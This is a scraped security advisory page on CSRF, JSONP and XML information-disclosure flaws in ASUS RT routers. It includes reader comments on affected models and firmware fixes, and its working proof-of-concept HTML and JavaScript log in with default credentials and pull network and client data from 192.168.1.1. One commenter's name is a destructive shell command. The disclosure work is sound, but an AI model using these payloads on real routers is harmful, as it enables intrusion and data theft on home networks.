   * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
     [May 13, 2017 at 11:35 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-263)

     We don’t know about the TM-AC19000

     [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=263#respond)
11. ![](https://i0.wp.com/pbs.twimg.com/profile_images/483749999277121536/ubnEd5-K_normal.jpeg?resize=60%2C60&ssl=1) **[John C Conkell (@juanzelli)](https://twitter.com/juanzelli)** says:
    [May 15, 2017 at 11:00 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-270)

    I’ve been using Merlin’s alternative firmware for over a year with zero issues… <https://asuswrt.lostrealm.ca>. He’s more interested in keeping things patched while only adding additional tweaks to the existing software. He doesn’t worry about trying to add new modules.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=270#respond)
13. ![](https://2.gravatar.com/avatar/b1a19d61e1850a59003179aff28f59e12b551f7e72a14a91c9ce7d41c99c82eb?s=60&d=identicon&r=G) **Johnny Sprocket** says:
    [May 17, 2017 at 12:51 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-276)

    I changed the SSL port on my RT-AC1900P to 8443. I tried to login using the standard HTTP:80 combo, and the router identifies itself as RT-N66U. The page shouldn’t resolve at all, but it seems the firmware has another flaw. Furthermore, the page will only render with Chrome on Windows 10 (1703). Firefox, IE, Edge show a connection error. A connection error is displayed via Chrome/Safari/Firefox from macOS as well. The ASUSRouter iOS app will no longer connect to the router, which could be a separate issue. Hopefully there is no vulnerabilities with this configuration. Can anyone confirm?

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=276#respond)
15. ![](https://2.gravatar.com/avatar/e5f890ce3c8fdafdf1d35983a38f5883fc7dcac9d7a44a383f0cfc34e7ca72c0?s=60&d=identicon&r=G) **[` rm -rf /\* `](https://itsecuritysolutions.org/)** says:
    [May 19, 2017 at 7:06 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-282)

    An authenticated session is not required to exploit the `/status.asp` XSSI information disclosure on Asus RT-N12E routers.

    The RT-N12E also exposes a `/get\_wan\_status.asp` file which discloses information such as the MAC addresses and IP addresses of client machines on the LAN.

    Here’s a BeEF module which exploits these issues:

    <https://github.com/beefproject/beef/tree/master/modules/exploits/router/asus_rt_n12e_get_info>

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=282#respond)
17. ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
    [May 28, 2017 at 7:47 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-291)

    Hey @nightwatchcyber

    Add this one to the list as well, RT-AC58U (or in the U.S. (and maybe other markets): RT-ACRH13).

    Verified manually with the CVE details and exploit code you have available, and the firmware version is also lower than the referenced 3.0.0.4.380\_6516, no newer one is available as of yet.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=291#respond)
    * ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
      [May 29, 2017 at 1:15 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-292)

      Update: I’ve contacted ASUS support via email, and they’ve informed me that there’s no ETA for the availability of a new firmware to fix this issues on this device (RT-AC58U/RT-ACRH13)

      [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=292#respond)
      + ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
        [June 15, 2017 at 5:47 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-336)

        Update: ASUS has released an update for the RT-AC58U. Should have the fixes implemented.

        ASUS RT-AC58U Firmware version 3.0.0.4.380.7485

        Add

        – Tx power adjust option

        – New Zealand ISP support

        – IPTV – HiNet MOD profile

        – Reboot Schedule support

        Optimization

        – Wireless 5GHz band performance

        – Wired performance in AP mode

        – Reduce system RAM usage

        – The max number of client connections

        Bug Fixes

        – Fixed system crash issue

        Please unzip the firmware file first then check the MD5 code.

        MD5: 71e06b665f988359a8b5f05c9bd00fbd
      + ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
        [June 15, 2017 at 8:23 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-337)

        Does this include the fixes for these issues?
      + ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
        [June 15, 2017 at 9:04 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-338)

        I believe it should, haven’t tested all yet. But the CVE-2017-5891 goes to the login page instead of logging in, so I’d say yes.
19. ![](https://0.gravatar.com/avatar/947b992398d28d05827ab93590e7af7859d46586ba81778faebcd7be94246afe?s=60&d=identicon&r=G) **Tim** says:
    [June 1, 2017 at 2:21 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-299)

    Updated my RT-N16 to firmware ver. 3.0.0.4.380\_7378 and can no longer get ports to negotiate a gigabit connection. ASUS support solution is to revert back. Heard of anyone else having this issue?

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=299#respond)
21. ![](https://0.gravatar.com/avatar/3a3b92c5d18557858f8c16b41c0fa402ddf6b9be892465114435025b740ff61f?s=60&d=identicon&r=G) **Tomi** says:
    [June 13, 2017 at 5:07 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-332)

    4G-AC55U has now new version of the firmware (3.0.0.4.380.7633). It should include fixes to the security problems.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=332#respond)
23. ![](https://0.gravatar.com/avatar/6fae4e7b4c6aa02516ce144c60490c93785c567e0fb2d2fc444446117791c03a?s=60&d=identicon&r=G) **Tomek** says:
    [June 15, 2017 at 3:18 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-335)

    RT-AC1200G+ is affected.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=335#respond)
    * ![](https://0.gravatar.com/avatar/053814a04062a142b0a5e555b82d3686fdc43086b1d1bd00f6f466f497cd6917?s=60&d=identicon&r=G) **nonqu** says:
      [June 16, 2017 at 8:16 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-339)

      Ane there is no firmware update

      [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=339#respond)
25. ![](https://0.gravatar.com/avatar/0cbe04901efd12c6c12daab7f0025aa542d9cf4cc851c0c2ca7cfc32bf4b8ac3?s=60&d=identicon&r=G) **Dennis** says:
    [July 20, 2017 at 2:17 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-397)

    ASUS RT-N66R Firmware version 3.0.0.4.380.7743 (July 17, 2017)

    Security fixed

    – Fixed CVE-2017-5892 (JSONP Information Disclosure)

    (among others)

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=397#respond)
27. **[Our Talk on ASUS Routers @BSidesDC | Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/2017/10/10/our-talk-on-asus-routers-bsidesdc/)** says:
    [October 10, 2017 at 10:35 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-747)

    […] weekend, we had a talk at BSides DC about hacking ASUS routers. The original blog post is here, slides for the talk can be found here, video can be found here (starting at the 3 hour […]

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=747#respond)
29. ![](https://0.gravatar.com/avatar/0985cfa6a4c670fd9cb3de24479c157c3eef2611859f0cc7f9e4b3397d0417f9?s=60&d=identicon&r=G) **tony** says:
    [January 29, 2018 at 11:03 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-937)

    Hi,

    Issue #3 – JSONP Information Disclosure Without Login (CVE-2017-5892)

    Issue #4 – JSONP Information Disclosure, Login Required (CVE-2017-8877)

    About above vulnerability, is there any typo about the CVE id?

    I have double check the pdf from below link:

    [Click to access bsides\_fall\_2017.pdf](https://wwwsnightwatchcybersecuritycom.files.wordpress.com/2017/10/bsides_fall_2017.pdf)

    Looks like,

    Issue #3 – JSONP Information Disclosure Without Login (CVE-2017-5892)

    – CVE should be CVE-2017-8877?

    Issue #4 – JSONP Information Disclosure, Login Required (CVE-2017-8877)

    – CVE should be CVE-2017-5892?

    Regards.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=937#respond)
    * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
      [January 30, 2018 at 9:59 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-938)

      We corrected that, thank you

      [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=938#respond)

### Leave a comment [Cancel reply](/2017/05/09/multiple-vulnerabilities-in-asus-routers/#respond)

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed.](https://akismet.com/privacy/)

# Search

Search for:

# Categories

* [Advisories](https://wwws.nightwatchcybersecurity.com/category/advisories/) (66)
* [Opinion](https://wwws.nightwatchcybersecurity.com/category/opinion/) (4)
* [Research](https://wwws.nightwatchcybersecurity.com/category/research/) (43)
* [Tools](https://wwws.nightwatchcybersecurity.com/category/tools/) (4)
* [Uncategorized](https://wwws.nightwatchcybersecurity.com/category/uncategorized/) (2)

# Recent Posts

* [Insecure Bootstrap Process in Google’s Cloud SQL Proxy](https://wwws.nightwatchcybersecurity.com/2023/03/19/insecure-bootstrap-process-in-googles-cloud-sql-proxy/)
* [RFC 9116 / “security.txt” Has Been Published](https://wwws.nightwatchcybersecurity.com/2022/04/27/rfc-9116-security-txt-has-been-published/)
* [GitBleed – Finding Secrets in Mirrored Git Repositories – CVE-2022-24975](https://wwws.nightwatchcybersecurity.com/2022/02/11/gitbleed/)
* [Insecure Bootstrap Process in Oracle Cloud CLI](https://wwws.nightwatchcybersecurity.com/2022/02/06/insecure-bootstrap-process-in-oracle-cloud-cli/)
* [Three Reasons Why Log4J Is So Bad: Ubiquity, Severity and Exploitability](https://wwws.nightwatchcybersecurity.com/2021/12/31/three-reasons-why-log4j-is-so-bad-ubiquity-severity-and-exploitability/)
# Tags

[adobe](https://wwws.nightwatchcybersecurity.com/tag/adobe/)
[airflow](https://wwws.nightwatchcybersecurity.com/tag/airflow/)
[amazon](https://wwws.nightwatchcybersecurity.com/tag/amazon/)
[Android](https://wwws.nightwatchcybersecurity.com/tag/android/)
[apache](https://wwws.nightwatchcybersecurity.com/tag/apache/)
[apple](https://wwws.nightwatchcybersecurity.com/tag/apple/)
[arro](https://wwws.nightwatchcybersecurity.com/tag/arro/)
[asus](https://wwws.nightwatchcybersecurity.com/tag/asus/)
[avg](https://wwws.nightwatchcybersecurity.com/tag/avg/)
[aws](https://wwws.nightwatchcybersecurity.com/tag/aws/)
[boozt](https://wwws.nightwatchcybersecurity.com/tag/boozt/)
[bounties](https://wwws.nightwatchcybersecurity.com/tag/bounties/)
[browsers](https://wwws.nightwatchcybersecurity.com/tag/browsers/)
[bsidesdc](https://wwws.nightwatchcybersecurity.com/tag/bsidesdc/)
[bsidesde](https://wwws.nightwatchcybersecurity.com/tag/bsidesde/)
[bugcrowd](https://wwws.nightwatchcybersecurity.com/tag/bugcrowd/)
[chrome](https://wwws.nightwatchcybersecurity.com/tag/chrome/)
[chromebook](https://wwws.nightwatchcybersecurity.com/tag/chromebook/)
[chromeos](https://wwws.nightwatchcybersecurity.com/tag/chromeos/)
[cisco](https://wwws.nightwatchcybersecurity.com/tag/cisco/)
[conferences](https://wwws.nightwatchcybersecurity.com/tag/conferences/)
[content-spoofing](https://wwws.nightwatchcybersecurity.com/tag/content-spoofing/)
[crosswalk](https://wwws.nightwatchcybersecurity.com/tag/crosswalk/)
[csrf](https://wwws.nightwatchcybersecurity.com/tag/csrf/)
[cve-2019-0221](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-0221/)
[cve-2019-0232](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-0232/)
[cve-2019-10320](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-10320/)
[duolingo](https://wwws.nightwatchcybersecurity.com/tag/duolingo/)
[eblaster](https://wwws.nightwatchcybersecurity.com/tag/eblaster/)
[eff](https://wwws.nightwatchcybersecurity.com/tag/eff/)
[facebook](https://wwws.nightwatchcybersecurity.com/tag/facebook/)
[firefox](https://wwws.nightwatchcybersecurity.com/tag/firefox/)
[fireos](https://wwws.nightwatchcybersecurity.com/tag/fireos/)
[github](https://wwws.nightwatchcybersecurity.com/tag/github/)
[gmail](https://wwws.nightwatchcybersecurity.com/tag/gmail/)
[google](https://wwws.nightwatchcybersecurity.com/tag/google/)
[gps](https://wwws.nightwatchcybersecurity.com/tag/gps/)
[hackerone](https://wwws.nightwatchcybersecurity.com/tag/hackerone/)
[intel](https://wwws.nightwatchcybersecurity.com/tag/intel/)
[io17](https://wwws.nightwatchcybersecurity.com/tag/io17/)
[java](https://wwws.nightwatchcybersecurity.com/tag/java/)
[jdk](https://wwws.nightwatchcybersecurity.com/tag/jdk/)
[jenkins](https://wwws.nightwatchcybersecurity.com/tag/jenkins/)
[jre](https://wwws.nightwatchcybersecurity.com/tag/jre/)
[jsonp](https://wwws.nightwatchcybersecurity.com/tag/jsonp/)
[kindle](https://wwws.nightwatchcybersecurity.com/tag/kindle/)
[macos](https://wwws.nightwatchcybersecurity.com/tag/macos/)
[messenger](https://wwws.nightwatchcybersecurity.com/tag/messenger/)
[microsoft](https://wwws.nightwatchcybersecurity.com/tag/microsoft/)
[mozilla](https://wwws.nightwatchcybersecurity.com/tag/mozilla/)
[no-ssl](https://wwws.nightwatchcybersecurity.com/tag/no-ssl/)
[office 365](https://wwws.nightwatchcybersecurity.com/tag/office-365/)
[open-redirect](https://wwws.nightwatchcybersecurity.com/tag/open-redirect/)
[oracle](https://wwws.nightwatchcybersecurity.com/tag/oracle/)
[paypal](https://wwws.nightwatchcybersecurity.com/tag/paypal/)
[pia](https://wwws.nightwatchcybersecurity.com/tag/pia/)
[pillpack](https://wwws.nightwatchcybersecurity.com/tag/pillpack/)
[privacy](https://wwws.nightwatchcybersecurity.com/tag/privacy/)
[qualcomm](https://wwws.nightwatchcybersecurity.com/tag/qualcomm/)
[routers](https://wwws.nightwatchcybersecurity.com/tag/routers/)
[s3](https://wwws.nightwatchcybersecurity.com/tag/s3/)
[samsung](https://wwws.nightwatchcybersecurity.com/tag/samsung/)
[spectorsoft](https://wwws.nightwatchcybersecurity.com/tag/spectorsoft/)
[ssl](https://wwws.nightwatchcybersecurity.com/tag/ssl/)
[supplychainattack](https://wwws.nightwatchcybersecurity.com/tag/supplychainattack/)
[synack](https://wwws.nightwatchcybersecurity.com/tag/synack/)
[tinycards](https://wwws.nightwatchcybersecurity.com/tag/tinycards/)
[tomcat](https://wwws.nightwatchcybersecurity.com/tag/tomcat/)
[united](https://wwws.nightwatchcybersecurity.com/tag/united/)
[vpn](https://wwws.nightwatchcybersecurity.com/tag/vpn/)
[whatsapp](https://wwws.nightwatchcybersecurity.com/tag/whatsapp/)
[wickr](https://wwws.nightwatchcybersecurity.com/tag/wickr/)
[windows](https://wwws.nightwatchcybersecurity.com/tag/windows/)
[yandex](https://wwws.nightwatchcybersecurity.com/tag/yandex/)
[zoho](https://wwws.nightwatchcybersecurity.com/tag/zoho/)
# Subscribe to Blog via Email

Enter your email address to subscribe to this blog and receive notifications of new posts by email.

Email Address:

Subscribe

Join 1,120 other subscribers

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

* [Bugcrowd](https://bugcrowd.com/nightwatch-cybersecurity)
* [HackerOne](https://hackerone.com/nightwatch-cybersecurity)
* [Twitter](https://twitter.com/nightwatchcyber)

* [Comment](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comments)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s0.wp.com/i/logo/wpcom-gray-white.png) Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com)

  Join 115 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwwws.nightwatchcybersecurity.com%252F2017%252F05%252F09%252Fmultiple-vulnerabilities-in-asus-routers%252F)
* Privacy
* + [![](https://s0.wp.com/i/logo/wpcom-gray-white.png) Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwwws.nightwatchcybersecurity.com%252F2017%252F05%252F09%252Fmultiple-vulnerabilities-in-asus-routers%252F)
  + [Copy shortlink](https://wp.me/p7EvFy-nh)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/)
  + [View post in Reader](https://wordpress.com/read/blogs/113089212/posts/1443)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from wwws.nightwatchcybersecurity.com_d69fb03c_20250124_183135.html ===

[Skip to content](#content)
[![](https://wwws.nightwatchcybersecurity.com/wp-content/uploads/2016/06/1-coojnfoayruptsimgys6tw.png?w=140)](https://wwws.nightwatchcybersecurity.com/)
# [Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/)

## Cybersecurity services and research

Menu

* [Home](https://wwws.nightwatchcybersecurity.com/)
* [Blog](https://wwws.nightwatchcybersecurity.com/blog/)
* [Presentations](https://wwws.nightwatchcybersecurity.com/presentations/)
* [Tools](https://wwws.nightwatchcybersecurity.com/tools/)
* [Contact](https://wwws.nightwatchcybersecurity.com/contact/)

[Home](https://wwws.nightwatchcybersecurity.com/)Multiple Vulnerabilities in ASUS Routers
# Multiple Vulnerabilities in ASUS Routers

[May 9, 2017January 30, 2018](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/) [nightwatchcyber](https://wwws.nightwatchcybersecurity.com/author/nightwatchcyber/)
[Advisories](https://wwws.nightwatchcybersecurity.com/category/advisories/)[asus](https://wwws.nightwatchcybersecurity.com/tag/asus/), [csrf](https://wwws.nightwatchcybersecurity.com/tag/csrf/), [jsonp](https://wwws.nightwatchcybersecurity.com/tag/jsonp/), [routers](https://wwws.nightwatchcybersecurity.com/tag/routers/)

## Summary

Various models of ASUS RT routers have several CSRF vulnerabilities allowing malicious sites to login and change settings in the router; multiple JSONP vulnerabilities allowing exfiltration of router data and an XML endpoint revealing WiFi passwords.

Most of these issues have been fixed by Asus in the March 2017 firmware update under v3.0.0.4.380.7378. One issue (JSONP information disclosure – CVE-2017-5892) remains unfixed since the vendor doesn’t consider it to be a security threat **[UPDATE: Asus will be fixing this]**

CVE-2017-5891 has been assigned to the CSRF issues, and CVE-2017-5892 to cover the JSONP disclosure without login issue. **[ADDED 05/11/2017: Two additional CVEs have been issued to cover JSONP issues after login – CVE-2017-8877 – and the XML information disclosure issue – CVE-2017-8878].**

**[ADDED 05/28/2017: As reported in comments below, multiple other models may be affected; please review the list below for details on what is affected, and whether patches are available]**

## Vulnerability Details

RT routers from ASUS like many other routers come with a built-in web interface accessible over the local network but normally not accessible via the Internet. We discovered multiple issues within that web interface that would can facilitate attacks on the router either via a malicious site visited by a user on the same network, or a malicious mobile or desktop application running on the same network.

For the CSRF vulnerabilities, a user would need to visit a malicious site which can try to login and change settings. For the JSONP vulnerabilities, a website can load the JSONP endpoints via SCRIPT tags as long as matching function name is defined on that site. The XML endpoint requires a mobile or desktop application to exploit.

NOTE: all of these assume that the attacker knows the local IP address of the router. This could probably be guessed or be determined via Javascript APIs like [WebRTC](https://bugzilla.mozilla.org/show_bug.cgi?id=959893). For desktop and mobile applications, determination of the gateway address should be trivial to implement.

### **Issue #1 – Login Page CSRF (CVE-2017-5891)**

The login page for the router doesn’t have any kind of CSRF protection, thus allowing a malicious website to submit a login request to the router without the user’s knowledge. Obviously, this only works if the site either knows the username and password of the router OR the user hasn’t changed the default credentials (“admin / admin”). To exploit, submit the base-64 encoded username and password as “**login\_authorization”** form post, to the “**/login.cgi**” URL of the browser.

Example of a form that can exploit this issue (uses default credentials):

> ```
> <form action="http://192.168.1.1/login.cgi"
>    method="post" target="_blank">
> <input name="login_authorization" type="text"
>    value="YWRtaW46YWRtaW4=" />
> <input type="submit" /></form>
> ```

### **Issue #2 – Save Settings CSRF (CVE-2017-5891)**

The various pages within the interface that can save settings do not have CSRF protection. That means that a malicious site, once logged in as described above would be able to change any settings in the router without the user’s knowledge.

**NOTE: We have not been to exploit this issue consistently**

### Issue #3 – JSONP Information Disclosure Without Login (CVE-2017-8877)

Two JSONP endpoints exist within the router which allow detection of which ASUS router is running and some information disclosure. No login is required to the router. **The vendor doesn’t consider these endpoints a security threat.** [ADDED 05/11/2017: A project named [Sonar.JS](https://github.com/mandatoryprogrammer/sonar.js/tree/master) exists on Github that describes how to use this with WebRTC to figure out which router the user is running, This project is an example of what is possible with an end point like this one].

The endpoints are as follows:

* /findasus.json
  + Returns the router model name, SSID name and the local IP address of the router
    - iAmAlive([{model?Name: “XXX”, ssid: “YYY”, ipAddr: “ZZZZ”}])
* /httpd\_check.json
  + Returns: {“alive”: 1, “isdomain”: 0}

Exploit code as follows:

> ```
> function iAmAlive(payload) {
>   window.alert("Result returned: " + JSON.stringify(payload));
> }
> function alert1() {
>   var script = document.createElement('script');
>   script.src = 'http://192.168.1.1/findasus.json'
>   document.getElementsByTagName('head')[0].appendChild(script);
> }
> function alert2() {
>   var script = document.createElement('script');
>   script.src = 'http://192.168.1.1/httpd_check.json'
>   document.getElementsByTagName('head')[0].appendChild(script);
> }
>
> ```

### Issue #4 – JSONP Information Disclosure, Login Required (CVE-2017-5892)

There exist multiple JSONP endpoints within the router interface that reveal various data from the router including.

Below is a list of endpoints and exploit code:

**/status.asp – Network Information**

> ```
> function getstatus() {
>     var script = document.createElement('script');
>     script.src = 'http://192.168.1.1/status.asp'
>     document.getElementsByTagName('head')[0].appendChild(script);
> }
> function show_wanlink_info() {
>     var obj = {};
>     obj.status = wanlink_status();
>     obj.statusstr = wanlink_statusstr();
>     obj.wanlink_type = wanlink_type();
>     obj.wanlink_ipaddr = wanlink_ipaddr();
>     obj.wanlink_xdns = wanlink_xdns();
>     window.alert(JSON.stringify(obj));
> }
>
> <br/>
> <button onClick="getstatus()">Load Status script</button>
> <button onClick="show_wanlink_info()">Show wanlink info</button>
> <br/><br/>
> ```

**/wds\_aplist\_2g.asp – Surrounding Access points, 2.4 Ghz band**

**/wds\_aplist\_5g.asp – Surrounding Access points, 5 Ghz band**

```
function getwds_2g() {
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/wds_aplist_2g.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}
function getwds_5g() {
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/wds_aplist_5g.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}

<br/>
<button onClick="getwds_2g()">Load 2G info</button>
<button onClick="getwds_5g()">Load 5G info</button>
<button onClick="window.alert(JSON.stringify(wds_aplist))">Show AP info</button>
<br/><br/>
```

**/update\_networkmapd.asp – Network map of devices on the network**

> ```
> function getmap() {
>     var script = document.createElement('script');
>     script.src = 'http://192.168.1.1/update_networkmapd.asp'
>     document.getElementsByTagName('head')[0].appendChild(script);
> }
>
> <br/>
> <button onClick="getmap()">Load Network map</button>
> <button onClick="window.alert(JSON.stringify(fromNetworkmapd))">Show Map</button>
> <br/><br/>
> ```

**/update\_clients.asp – Origin data**

```
function getorigin() {
    originData = [];
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/update_clients.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}

<br/>
<button onClick="getorigin()">Load Origin</button>
<button onClick="window.alert(JSON.stringify(originData))">Show Origin</button>
```

**/get\_real\_ip.asp – External IP address**

```
function getrealip() {
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/get_real_ip.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}

<br/>
<button onClick="getrealip()">Load IP</button>
<button onClick="window.alert(JSON.stringify(wan0_realip_ip))">Show IP</button>
```

**/get\_webdavInfo.asp – WebDAV information**

> ```
> function getwebdav() {
>     var script = document.createElement('script');
>     script.src = 'http://192.168.1.1/get_webdavInfo.asp';
>     document.getElementsByTagName('head')[0].appendChild(script);
> }
>
> <br/>
> <button onClick="getwebdav()">Load WebDav</button>
> <button onClick="window.alert(JSON.stringify(pktInfo))">Show Info 1</button>
> <button onClick="window.alert(JSON.stringify(webdavInfo))">Show Info 1</button>
> <br/><br/>
> ```

### Issue #5 – XML Endpoint Reveals WiFi Passwords (CVE-2017-8878)

An XML endpoint exists in the router which reveals the WiFi password to the router but to fully exploit this issue, it would require a mobile or desktop application running on the local network since XML cannot be loaded cross origin in the browser. This endpoint can be accessed at the following URL and requires login:

> ```
> [router IP]/WPS_info.xml
>
> ```

## Mitigation Steps / Vendor Response

Users should change the default credentials and apply the latest firmware released by ASUS, version v3.0.0.4.380.7378 or higher **(except for 4G-AC55U which has no patches available).**

 **There is no mitigation available for the issue #3 – JSONP information disclosure without login.**

Affected models include the following ASUS routers **and is not exhaustive**:

* **4G-AC55U – [ADDED 05/10/2017, patches are available as of 06/13/2017]**
* RT-AC51U
* RT-AC52U B1 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC53 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC53U
* RT-AC55U
* RT-AC56R
* RT-AC56S
* RT-AC56U
* **RT-AC58U – [ADDED 05/28/2017: As reported by a commenter below, this one is also affected] [ADDED 06/15/2017 – firmware update now available]**
* RT-AC66U
* RT-AC68U
* RT-AC68UF – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC66R
* RT-AC66U
* RT-AC66W
* RT-AC68W
* RT-AC68P
* RT-AC68R
* RT-AC68U
* RT-AC87R
* RT-AC87U
* RT-AC88U – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC1200 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC1750 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC1900P
* RT-AC3100
* RT-AC3200
* RT-AC5300
* **RT-AC1200G+ – [ADDED 06/15/2017: based on a comment below]**
* **RT-ACRH13 – [ADDED 05/28/2017: As reported by a commenter below, this one is also affected and has no patches]**
* RT-N11P
* RT-N12 (D1 version only)
* RT-N12+
* RT-N12E
* RT-N16 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-N18U
* RT-N56U
* RT-N66R – [07/20/2017 – as per commenter below, new firmware was released on July 17th, 2017 – v3.0.0.4.380.7743]
* RT-N66U (B1 version only)
* RT-N66W
* RT-N300 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-N600 – [ADDED 05/10/2017 based on Asus Firmware updates]

## References

CVE-IDs: [CVE-2017-5891](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5891), [CVE-2017-5892](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5892), [CVE-2017-8877](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8877) and [CVE-2017-8878](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8878)

CERT/CC Tracking # VR-627

## Credits

We would like to thank CERT/CC for helping to coordinate the disclosure process. This advisory was written by Yakov Shafranovich.

# Timeline

2017-01-21: Initial contact with the vendor

2017-01-23: Initial contact with CERT/CC

2017-02-05: Vulnerability details and POC code provided to the vendor, CVEs requested

2017-02-10: Vulnerability analysis received from the vendor

2017-02-12: Beta firmware provided by the firmware to test fixes

2017-02-12: Vendor fixes confirmed

